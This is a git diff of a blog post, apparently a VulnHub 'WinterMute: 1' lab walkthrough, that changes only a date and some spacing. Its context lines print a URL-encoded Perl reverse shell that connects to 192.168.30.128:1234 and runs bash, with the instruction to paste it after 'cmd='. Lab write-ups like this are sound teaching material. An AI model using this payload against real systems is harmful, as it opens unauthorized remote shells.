@@ -3,7 +3,7 @@ layout: post
 title: "WinterMute: 1 Walkthrough"
 subtitle: "Things aren't different. Things are things."
 date: 2018-09-17 11:59:47 +0000
-last_modified_at: 2018-09-19 07:55:59 +0000
+last_modified_at: 2018-11-19 13:48:57 +0000
 category: Walkthrough
 tags: [VulnHub, WinterMute]
 comments: true
@@ -179,7 +179,7 @@ _After urlencoding_
 perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.30.128%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27
 ```
 
-Copy and paste the _urlencoded_ Perl reverse shell after `cmd=`. And&hellip;a shell at last.
+Copy and paste the _urlencoded_ Perl reverse shell after `cmd=`. And &hellip; a shell at last.
 
 ![3da260e0.png](/assets/images/posts/wintermute-1-walkthrough/3da260e0.png)
 
